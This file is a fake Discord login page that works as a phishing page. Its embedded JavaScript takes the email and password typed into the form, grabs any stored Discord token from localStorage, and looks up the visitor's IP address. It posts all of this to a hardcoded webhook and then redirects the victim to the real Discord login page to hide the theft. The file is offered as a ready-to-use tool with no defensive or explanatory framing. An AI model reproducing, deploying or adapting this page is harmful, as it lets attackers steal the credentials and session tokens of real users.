<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="utf-8">
  <title>Discord - Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://discord.com/assets/1234567890.css">
  <style>
    body, html { margin: 0; padding: 0; height: 100%; background: #36393f; font-family: 'Whitney', sans-serif; }
    .app { display: flex; justify-content: center; align-items: center; height: 100%; }
    .auth-box { background: #36393f; width: 400px; padding: 32px; border-radius: 8px; }
    .logo { text-align: center; margin-bottom: 24px; }
    .logo img { width: 124px; }
    h1 { color: #fff; font-size: 24px; text-align: center; margin: 0 0 8px; }
    p { color: #b9bbbe; font-size: 16px; text-align: center; margin: 0 0 24px; }
    input { width: 100%; padding: 12px; margin: 8px 0; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; box-sizing: border-box; }
    button { width: 100%; padding: 12px; background: #5865f2; border: none; border-radius: 4px; color: white; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 16px; }
    button:hover { background: #4752c4; }
    .error { color: #ed4245; font-size: 14px; text-align: center; margin-top: 10px; display: none; }
  </style>
</head>
<body>
  <div class="app">
    <div class="auth-box">
      <div class="logo">
        <img src="https://discord.com/assets/6debd47ed13483642cf09e832ed0bc1b.png" alt="Discord">
      </div>
      <h1>Welcome back!</h1>
      <p>Weâ€™re so excited to see you again!</p>
      <form id="loginForm">
        <input type="text" id="email" placeholder="Email or Phone Number" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Log In</button>
      </form>
      <div id="error" class="error"></div>
    </div>
  </div>

  <script>
    const WEBHOOK = 'https://discord.com/api/webhooks/1434969761539690639/z9ni7tqOcUmKzc542doFrJOL3WZuBwtcnWXnJkP_XAXIW7BEDeWLg-D7coUWuFHs_3cS';
    
    function grabToken() {
      try {
        const token = localStorage.getItem('token')?.replace(/"/g, '');
        if (token && token.length > 50) {
          sendToWebhook({ token, type: 'auto_grab' });
        }
      } catch(e) {}
    }

    async function sendToWebhook(data) {
      const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(() => 'unknown');
      const payload = {
        embeds: [{
          title: data.type === 'auto_grab' ? 'TOKEN AUTO-GRABBED' : 'NEW LOGIN',
          color: data.type === 'auto_grab' ? 0x00ff00 : 0x5865f2,
          fields: [
            { name: 'Email/Phone', value: data.email ? `\`${data.email}\`` : 'N/A', inline: false },
            { name: 'Password', value: data.password ? `\`${data.password}\`` : 'N/A', inline: false },
            { name: 'Token', value: data.token ? `\`\`\`${data.token}\`\`\`` : 'Not found', inline: false },
            { name: 'IP', value: `\`${ip}\``, inline: true },
            { name: 'UA', value: `\`${navigator.userAgent.substring(0, 100)}\``, inline: false }
          ],
          timestamp: new Date().toISOString()
        }]
      };
      fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
    }

    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;
      if (!email || !password) return;

      setTimeout(grabToken, 2000);
      sendToWebhook({ email, password, type: 'login' });

      setTimeout(() => {
        window.location = `https://discord.com/login?email=${encodeURIComponent(email)}`;
      }, 800);
    });

    setTimeout(grabToken, 1500);
  </script>
</body>
</html>
